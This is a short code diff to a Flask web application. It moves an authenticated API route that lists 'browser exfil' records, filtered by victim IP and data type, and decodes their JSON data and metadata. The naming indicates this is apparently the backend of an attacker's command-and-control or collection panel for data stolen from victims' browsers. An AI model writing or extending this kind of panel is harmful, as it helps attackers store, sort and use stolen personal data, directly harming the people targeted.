@@ -34,3 +34,27 @@ def api_browser_exfil_stats():
     if 'IAm-logined' not in session:
         return jsonify({'error': 'Not authenticated'}), 401
     return jsonify(intelsvc.browser_exfil_stats())
+
+
+# ---------------------------------------------------------------------------
+# P3.23: moved verbatim from app.py (exfil listing)
+# ---------------------------------------------------------------------------
+@bp.route('/api/browser-exfil')
+def api_browser_exfil_list():
+    if 'IAm-logined' not in session:
+        return jsonify({'error': 'Not authenticated'}), 401
+    victim_ip = request.args.get('ip')
+    data_type = request.args.get('type')
+    results = db.get_browser_exfil(victim_ip, data_type)
+    for r in results:
+        if isinstance(r.get('data'), str):
+            try:
+                r['data'] = json.loads(r['data'])
+            except Exception:
+                pass
+        if isinstance(r.get('metadata'), str):
+            try:
+                r['metadata'] = json.loads(r['metadata'])
+            except Exception:
+                pass
+    return jsonify({'exfil_data': results, 'total': len(results)})
